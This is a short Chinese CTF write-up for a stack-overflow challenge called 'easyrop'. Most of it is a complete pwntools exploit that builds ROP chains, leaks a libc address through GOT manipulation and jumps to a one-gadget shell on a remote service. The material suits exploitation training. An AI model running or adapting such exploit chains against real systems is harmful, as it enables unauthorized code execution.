## 考点

no_leak栈溢出，自己找gadget拿shell



## 工具

python3



## 步骤

~~~
from pwn import *

p = process("./easyrop", level="debug")
p = remote('10.212.27.23', 8888)
elf = ELF('./easyrop')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
# libc = elf.libc
libc = ELF('./libc-2.27.so')
pop_all = 0x4006EA # pop rbx, rbp, 12, 13, 14, 15, ret
payload = b"A" * 0x40
payload += p64(0xdeadbeef)
payload += p64(pop_all)
diff = libc.sym['write'] - libc.sym['alarm']
print(diff & 0xffffffffffffffff)
payload += p64(0x400510)
payload += p64(0x00000000006012C0 + 8 + 0x3d)
payload += b"\x00" * 8 * 4
payload += p64(0x00000000004005d8)
payload += p64(0x00000000004006f3) 
payload += p64(1)
payload += p64(0x400510)
# gdb.attach(p)
print(hex(len(payload)))
p.send(payload)

sleep(1)
payload = b"B" * 0x40
payload += p64(0xdeadbeef)
payload += p64(pop_all)
payload += p64(diff & 0xffffffffffffffff)
payload += p64(0x00000000006012C0 + 0x3d)
payload += b"\x00" * 8 * 4
payload += p64(0x00000000004005d8)
payload += p64(0x00000000004006f3) 
payload += p64(1)
payload += p64(0x00000000004006f1)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(0x0000000000400578)
payload += p64(0x6012c0 - 8)
payload += p64(0x000000000040067f)
payload += p64(0xdeadbeef)

print(hex(len(payload)))

p.send(payload)
write = u64(p.recv(6) + b'\x00' + b'\x00')
libc_addr = write - libc.sym['read']
log.info(hex(libc_addr))


sleep(1)
payload = p64(libc_addr + 0x10a2fc)*10
print(hex(len(payload)))
p.sendline(payload)
# p.sendline(payload)
p.interactive()

~~~






## 总结

这题是去年被非预期的revenge，呜呜呜我以为这题对新手很难的，结果还是被大佬用别的方式做出来了，我是废物
